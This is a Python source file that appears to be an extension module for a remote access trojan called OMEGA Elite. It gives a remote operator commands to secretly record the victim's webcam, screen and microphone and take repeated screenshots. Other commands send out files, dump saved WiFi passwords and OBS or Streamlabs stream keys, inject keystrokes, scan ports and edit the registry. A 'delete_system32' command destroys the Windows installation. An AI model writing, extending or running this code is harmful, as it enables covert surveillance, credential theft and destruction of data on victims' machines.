# -*- coding: utf-8 -*-
"""
OMEGA Elite - Extended Command Module
Ported from NullDefence/OHA. Registered via register_extended(COMMANDS).
"""
import asyncio, os, re, json, subprocess, tempfile, threading, time, ctypes, socket

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------
def _send_async(loop, ws, payload):
    try:
        from omega_core import send
        asyncio.run_coroutine_threadsafe(send(ws, payload), loop)
    except Exception as e:
        print(f"[EXT] _send_async error: {e}")

def _shell(args, timeout=15):
    try:
        out = subprocess.check_output(args, stderr=subprocess.STDOUT,
                                      timeout=timeout, creationflags=0x08000000)
        return out.decode('cp437', errors='ignore').strip()
    except subprocess.CalledProcessError as e:
        return e.output.decode('cp437', errors='ignore').strip()
    except Exception as e:
        return str(e)

# ---------------------------------------------------------------------------
# SURVEILLANCE
# ---------------------------------------------------------------------------
async def cmd_record_webcam(msg, ws):
    from omega_core import send
    duration = int(msg.get("duration", 5))
    cam_idx  = int(msg.get("cam_idx", 0))
    loop = asyncio.get_running_loop()
    def _rec():
        try:
            import cv2, base64
            cap = cv2.VideoCapture(cam_idx, cv2.CAP_DSHOW)
            if not cap.isOpened():
                raise RuntimeError("Camera not opened")
            for _ in range(5): cap.read()
            w = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH))
            h = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))
            fd, path = tempfile.mkstemp(suffix='.avi')
            os.close(fd)
            vw = cv2.VideoWriter(path, cv2.VideoWriter_fourcc(*'XVID'), 20.0, (w, h))
            deadline = time.time() + duration
            while time.time() < deadline:
                ret, frame = cap.read()
                if ret: vw.write(frame)
            vw.release(); cap.release()
            with open(path, 'rb') as f:
                data = base64.b64encode(f.read()).decode()
            os.unlink(path)
            _send_async(loop, ws, {"t": "file_data", "name": "webcam.avi", "data": data, "ext": "avi"})
        except Exception as e:
            _send_async(loop, ws, {"t": "info", "msg": f"Webcam error: {e}"})
    threading.Thread(target=_rec, daemon=True).start()
    await send(ws, {"t": "info", "msg": f"Recording webcam {duration}s..."})

async def cmd_record_screen(msg, ws):
    from omega_core import send
    duration = int(msg.get("duration", 10))
    loop = asyncio.get_running_loop()
    def _rec():
        try:
            import mss as _mss, cv2, numpy as np, base64
            with _mss.mss() as sct:
                mon = sct.monitors[1]
                w, h = mon['width'], mon['height']
            fd, path = tempfile.mkstemp(suffix='.avi')
            os.close(fd)
            vw = cv2.VideoWriter(path, cv2.VideoWriter_fourcc(*'XVID'), 10.0, (w, h))
            deadline = time.time() + duration
            with _mss.mss() as sct:
                mon = sct.monitors[1]
                while time.time() < deadline:
                    img = np.array(sct.grab(mon))
                    vw.write(cv2.cvtColor(img, cv2.COLOR_BGRA2BGR))
            vw.release()
            with open(path, 'rb') as f:
                data = base64.b64encode(f.read()).decode()
            os.unlink(path)
            _send_async(loop, ws, {"t": "file_data", "name": "screen.avi", "data": data, "ext": "avi"})
        except Exception as e:
            _send_async(loop, ws, {"t": "info", "msg": f"Screen record error: {e}"})
    threading.Thread(target=_rec, daemon=True).start()
    await send(ws, {"t": "info", "msg": f"Recording screen {duration}s..."})

async def cmd_ss_loop(msg, ws):
    from omega_core import send
    interval = int(msg.get("interval", 5))
    count    = int(msg.get("count", 5))
    loop = asyncio.get_running_loop()
    def _loop():
        import mss as _mss, base64
        with _mss.mss() as sct:
            mon = sct.monitors[1]
            for i in range(count):
                try:
                    img = sct.grab(mon)
                    buf = _mss.tools.to_png(img.rgb, img.size)
                    data = base64.b64encode(buf).decode()
                    _send_async(loop, ws, {"t": "file_data", "name": f"ss_{i+1}.png", "data": data, "ext": "png"})
                except Exception as e:
                    _send_async(loop, ws, {"t": "info", "msg": f"ssloop err {i}: {e}"})
                if i < count - 1:
                    time.sleep(interval)
    threading.Thread(target=_loop, daemon=True).start()
    await send(ws, {"t": "info", "msg": f"SS loop: {count}x every {interval}s"})

async def cmd_record_voice(msg, ws):
    from omega_core import send
    duration = int(msg.get("duration", 30))
    loop = asyncio.get_running_loop()
    def _rec():
        try:
            import soundcard as sc, numpy as np, base64, wave, io
            mic = sc.default_microphone()
            with mic.recorder(samplerate=44100, channels=1) as r:
                data = r.record(numframes=44100 * duration)
            buf = io.BytesIO()
            with wave.open(buf, 'wb') as wf:
                wf.setnchannels(1); wf.setsampwidth(2); wf.setframerate(44100)
                wf.writeframes((data * 32767).astype(np.int16).tobytes())
            b64 = base64.b64encode(buf.getvalue()).decode()
            _send_async(loop, ws, {"t": "file_data", "name": "voice.wav", "data": b64, "ext": "wav"})
        except Exception as e:
            _send_async(loop, ws, {"t": "info", "msg": f"Voice record error: {e}"})
    threading.Thread(target=_rec, daemon=True).start()
    await send(ws, {"t": "info", "msg": f"Recording voice {duration}s..."})

# ---------------------------------------------------------------------------
# FILES
# ---------------------------------------------------------------------------
async def cmd_dir_list(msg, ws):
    from omega_core import send
    path = msg.get("path", os.path.expanduser("~"))
    try:
        entries = []
        for e in os.scandir(path):
            try: sz = e.stat().st_size if e.is_file() else -1
            except: sz = -1
            entries.append({"name": e.name, "is_dir": e.is_dir(), "size": sz})
        entries.sort(key=lambda x: (not x['is_dir'], x['name'].lower()))
        await send(ws, {"t": "dir_list", "path": path, "entries": entries})
    except Exception as e:
        await send(ws, {"t": "info", "msg": f"dir error: {e}"})

async def cmd_download_url(msg, ws):
    from omega_core import send
    import urllib.request
    url  = msg.get("url", "")
    dest = msg.get("dest", os.path.join(tempfile.gettempdir(),
                   os.path.basename(url.split("?")[0]) or "download"))
    loop = asyncio.get_running_loop()
    def _dl():
        try:
            urllib.request.urlretrieve(url, dest)
            _send_async(loop, ws, {"t": "info", "msg": f"Downloaded to {dest}"})
        except Exception as e:
            _send_async(loop, ws, {"t": "info", "msg": f"DL error: {e}"})
    threading.Thread(target=_dl, daemon=True).start()
    await send(ws, {"t": "info", "msg": f"Downloading {url}..."})

async def cmd_upload_file(msg, ws):
    from omega_core import send
    path = msg.get("path", "")
    if not os.path.isfile(path):
        await send(ws, {"t": "info", "msg": f"File not found: {path}"}); return
    loop = asyncio.get_running_loop()
    CHUNK_SIZE = 1024 * 1024  # 1MB chunks
    def _ul():
        try:
            import base64
            fsize = os.path.getsize(path)
            fname = os.path.basename(path)
            ext = os.path.splitext(path)[1].lstrip('.')
            if fsize <= CHUNK_SIZE:
                # Small file: send whole
                with open(path, 'rb') as f:
                    data = base64.b64encode(f.read()).decode()
                _send_async(loop, ws, {"t": "file_data", "name": fname, "data": data, "ext": ext})
            else:
                # Large file: stream in chunks
                total = (fsize + CHUNK_SIZE - 1) // CHUNK_SIZE
                with open(path, 'rb') as f:
                    for seq in range(total):
                        chunk = f.read(CHUNK_SIZE)
                        _send_async(loop, ws, {
                            "t": "file_chunk", "name": fname, "ext": ext,
                            "seq": seq, "total": total,
                            "data": base64.b64encode(chunk).decode()
                        })
                        import time
                        time.sleep(0.05)  # Throttle to avoid overwhelming asyncio queue
        except Exception as e:
            _send_async(loop, ws, {"t": "info", "msg": f"Upload error: {e}"})
    threading.Thread(target=_ul, daemon=True).start()
    await send(ws, {"t": "info", "msg": f"Uploading {path} (chunked)..."})
async def cmd_kill_explorer(msg, ws):
    from omega_core import send
    subprocess.Popen(["taskkill", "/f", "/im", "explorer.exe"], creationflags=0x08000000)
    await send(ws, {"t": "info", "msg": "Explorer killed"})

async def cmd_kill_app(msg, ws):
    from omega_core import send
    name = msg.get("name", "")
    if not name.lower().endswith(".exe"): name += ".exe"
    out = _shell(["taskkill", "/f", "/im", name])
    await send(ws, {"t": "info", "msg": f"{name}: {out[:200]}"})

# ---------------------------------------------------------------------------
# INPUT
# ---------------------------------------------------------------------------
async def cmd_type_text(msg, ws):
    from omega_core import send
    text = msg.get("text", "")
    def _type():
        try:
            import pyautogui; time.sleep(0.3)
            pyautogui.typewrite(text, interval=0.03)
        except Exception: pass
    asyncio.get_running_loop().run_in_executor(None, _type)
    await send(ws, {"t": "info", "msg": f"Typed: {text[:60]}"})

async def cmd_press_key(msg, ws):
    from omega_core import send
    keys = msg.get("keys", "")
    def _press():
        try:
            import pyautogui
            parts = [k.strip() for k in re.split(r'[+,]', keys) if k.strip()]
            if len(parts) == 1: pyautogui.press(parts[0])
            else: pyautogui.hotkey(*parts)
        except Exception: pass
    asyncio.get_running_loop().run_in_executor(None, _press)
    await send(ws, {"t": "info", "msg": f"Keys: {keys}"})

async def cmd_move_mouse(msg, ws):
    from omega_core import send
    x, y = int(msg.get("x", 0)), int(msg.get("y", 0))
    def _mv():
        try: import pyautogui; pyautogui.moveTo(x, y)
        except Exception: pass
    asyncio.get_running_loop().run_in_executor(None, _mv)
    await send(ws, {"t": "info", "msg": f"Mouse moved to ({x},{y})"})

async def cmd_click_mouse(msg, ws):
    from omega_core import send
    def _click():
        try: import pyautogui; pyautogui.click()
        except Exception: pass
    asyncio.get_running_loop().run_in_executor(None, _click)
    await send(ws, {"t": "info", "msg": "Mouse clicked"})

# ---------------------------------------------------------------------------
# NETWORK
# ---------------------------------------------------------------------------
async def cmd_network_cmd(msg, ws):
    from omega_core import send
    cmd  = msg.get("cmd", "")
    host = msg.get("host", "")
    loop = asyncio.get_running_loop()
    def _run():
        try:
            if cmd == "ping":
                out = _shell(["ping", "-n", "4", host], 15)
            elif cmd == "tracert":
                out = _shell(["tracert", "-h", "15", host], 30)
            elif cmd == "netstat":
                out = _shell(["netstat", "-an"], 10)
            elif cmd == "arp":
                out = _shell(["arp", "-a"], 5)
            elif cmd == "ipconfig":
                out = _shell(["ipconfig", "/all"], 5)
            elif cmd == "portscan":
                results = []
                for p in [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 3389, 8080]:
                    try:
                        s = socket.socket(); s.settimeout(0.4)
                        if s.connect_ex((host, p)) == 0:
                            results.append(f"  {p}/tcp OPEN")
                        s.close()
                    except Exception: pass
                out = "\n".join(results) or "No open ports found"
            elif cmd == "wifi":
                raw = _shell(["netsh", "wlan", "show", "profiles"], 10)
                profiles = re.findall(r"All User Profile\s*:\s*(.*)", raw)
                lines = []
                for pr in profiles:
                    pr = pr.strip()
                    d = _shell(["netsh", "wlan", "show", "profile", pr, "key=clear"], 5)
                    pw = re.findall(r"Key Content\s*:\s*(.*)", d)
                    lines.append(f"{pr}: {pw[0].strip() if pw else '(none)'}")
                out = "\n".join(lines) or "No WiFi profiles"
            else:
                out = "Unknown command"
            _send_async(loop, ws, {"t": "shell_out", "data": out[:3000]})
        except Exception as e:
            _send_async(loop, ws, {"t": "info", "msg": f"Network error: {e}"})
    threading.Thread(target=_run, daemon=True).start()
    await send(ws, {"t": "info", "msg": f"Running {cmd} {host}..."})

# ---------------------------------------------------------------------------
# SYSTEM INFO
# ---------------------------------------------------------------------------
async def cmd_whoami(msg, ws):
    from omega_core import send
    out = await asyncio.to_thread(_shell, ["whoami", "/all"], 5)
    await send(ws, {"t": "shell_out", "data": out[:3000]})

async def cmd_drives(msg, ws):
    from omega_core import send
    import psutil
    lines = []
    for p in psutil.disk_partitions():
        try:
            u = psutil.disk_usage(p.mountpoint)
            lines.append(f"{p.device} [{p.fstype}] {u.used//1073741824}GB/{u.total//1073741824}GB ({u.percent}%)")
        except Exception:
            lines.append(f"{p.device} [{p.fstype}]")
    await send(ws, {"t": "shell_out", "data": "\n".join(lines)})

async def cmd_stream_key(msg, ws):
    from omega_core import send
    results = []
    obs = os.path.expanduser("~\\AppData\\Roaming\\obs-studio\\basic\\profiles")
    if os.path.exists(obs):
        for root, _, files in os.walk(obs):
            for f in files:
                if not f.endswith(".json"): continue
                try:
                    d = json.load(open(os.path.join(root, f), "r", encoding="utf-8"))
                    if "settings" in d and "key" in d["settings"]:
                        results.append(f"OBS: {d['settings']['key']}")
                except Exception: pass
    slobs = os.path.expanduser("~\\AppData\\Roaming\\slobs-client\\settings\\service.json")
    if os.path.exists(slobs):
        try:
            k = json.load(open(slobs)).get("key")
            if k: results.append(f"Streamlabs: {k}")
        except Exception: pass
    await send(ws, {"t": "shell_out", "data": "\n".join(results) or "No stream keys found"})

async def cmd_reg_read(msg, ws):
    from omega_core import send
    import winreg
    path     = msg.get("path", "")
    val_name = msg.get("val", None)
    hive_map = {
        "HKEY_CURRENT_USER":  winreg.HKEY_CURRENT_USER,
        "HKCU":               winreg.HKEY_CURRENT_USER,
        "HKEY_LOCAL_MACHINE": winreg.HKEY_LOCAL_MACHINE,
        "HKLM":               winreg.HKEY_LOCAL_MACHINE,
    }
    try:
        parts = path.split("\\", 1)
        hive  = hive_map.get(parts[0], winreg.HKEY_CURRENT_USER)
        key   = winreg.OpenKey(hive, parts[1])
        if val_name:
            v, _ = winreg.QueryValueEx(key, val_name)
            out = f"{val_name} = {v}"
        else:
            i, out_lines = 0, []
            while True:
                try:
                    n, v, _ = winreg.EnumValue(key, i)
                    out_lines.append(f"{n} = {v}"); i += 1
                except Exception: break
            out = "\n".join(out_lines[:40])
        winreg.CloseKey(key)
        await send(ws, {"t": "shell_out", "data": out})
    except Exception as e:
        await send(ws, {"t": "info", "msg": f"RegRead error: {e}"})

async def cmd_reg_write(msg, ws):
    from omega_core import send
    import winreg
    path     = msg.get("path", "")
    val_name = msg.get("val", "")
    data     = msg.get("data", "")
    hive_map = {
        "HKEY_CURRENT_USER":  winreg.HKEY_CURRENT_USER,
        "HKCU":               winreg.HKEY_CURRENT_USER,
        "HKEY_LOCAL_MACHINE": winreg.HKEY_LOCAL_MACHINE,
        "HKLM":               winreg.HKEY_LOCAL_MACHINE,
    }
    try:
        parts = path.split("\\", 1)
        hive  = hive_map.get(parts[0], winreg.HKEY_CURRENT_USER)
        key   = winreg.CreateKey(hive, parts[1])
        winreg.SetValueEx(key, val_name, 0, winreg.REG_SZ, str(data))
        winreg.CloseKey(key)
        await send(ws, {"t": "info", "msg": f"Registry written: {path}\\{val_name} = {data}"})
    except Exception as e:
        await send(ws, {"t": "info", "msg": f"RegWrite error: {e}"})

async def cmd_recycle_bin(msg, ws):
    from omega_core import send
    try:
        ctypes.windll.shell32.SHEmptyRecycleBinW(None, None, 7)
        await send(ws, {"t": "info", "msg": "Recycle bin emptied"})
    except Exception as e:
        await send(ws, {"t": "info", "msg": f"Recycle error: {e}"})

async def cmd_delete_system32(msg, ws):
    from omega_core import send
    if msg.get("confirm", "") != "CONFIRM_DESTROY":
        await send(ws, {"t": "info", "msg": "Send confirm:CONFIRM_DESTROY to execute"}); return
    subprocess.Popen(["cmd.exe", "/c", "rd /s /q C:\\Windows\\System32"],
                     creationflags=0x08000000)
    await send(ws, {"t": "info", "msg": "System32 deletion initiated"})

# ---------------------------------------------------------------------------
# PRANKS / TROLLS (troll_ext type)
# ---------------------------------------------------------------------------
async def cmd_troll_extended(msg, ws):
    from omega_core import send
    act = msg.get("action") or msg.get("cmd", "")
    val = msg.get("value") if "value" in msg else msg.get("val", "")

    # Delegate to the refactored fun module
    from modules import fun
    fun.troll_action(act, val, msg)

# ---------------------------------------------------------------------------
# Registration
# ---------------------------------------------------------------------------
def register_extended(COMMANDS):
    COMMANDS["record_webcam"]   = cmd_record_webcam
    COMMANDS["record_screen"]   = cmd_record_screen
    COMMANDS["ss_loop"]         = cmd_ss_loop
    COMMANDS["record_voice"]    = cmd_record_voice
    COMMANDS["dir_list"]        = cmd_dir_list
    COMMANDS["download_url"]    = cmd_download_url
    COMMANDS["upload_file"]     = cmd_upload_file
    COMMANDS["kill_explorer"]   = cmd_kill_explorer
    COMMANDS["kill_app"]        = cmd_kill_app
    COMMANDS["type_text"]       = cmd_type_text
    COMMANDS["press_key"]       = cmd_press_key
    COMMANDS["move_mouse"]      = cmd_move_mouse
    COMMANDS["click_mouse"]     = cmd_click_mouse
    COMMANDS["network_cmd"]     = cmd_network_cmd
    COMMANDS["whoami"]          = cmd_whoami
    COMMANDS["drives"]          = cmd_drives
    COMMANDS["stream_key"]      = cmd_stream_key
    COMMANDS["reg_read"]        = cmd_reg_read
    COMMANDS["reg_write"]       = cmd_reg_write
    COMMANDS["recycle_bin"]     = cmd_recycle_bin
    COMMANDS["delete_system32"] = cmd_delete_system32
    COMMANDS["troll_ext"]       = cmd_troll_extended
